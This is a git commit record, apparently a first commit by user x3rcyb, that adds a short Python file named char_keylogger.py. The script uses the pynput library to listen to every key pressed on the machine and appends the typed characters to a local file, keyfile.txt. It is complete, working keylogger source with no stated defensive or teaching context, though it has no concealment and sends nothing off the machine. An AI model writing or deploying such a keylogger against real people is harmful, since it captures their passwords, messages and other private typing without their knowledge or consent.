f59b34c08bce372031ddd593aaff4ca5a882a8fe
x3rcyb <135162629+x3rcyb@users.noreply.github.com>
2023-12-04 22:03:39 +0530

    first commit

---
+++ char_keylogger.py
@@ -0,0 +1,14 @@
+from pynput import keyboard
+
+def keypressed(key):
+    print (str(key))
+    with open("keyfile.txt", 'a') as logkey:
+        try:
+            char = key.char
+            logkey.write(char)
+        except:
+            print("Error getting char")
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keypressed)
+    listener.start()
+    input()
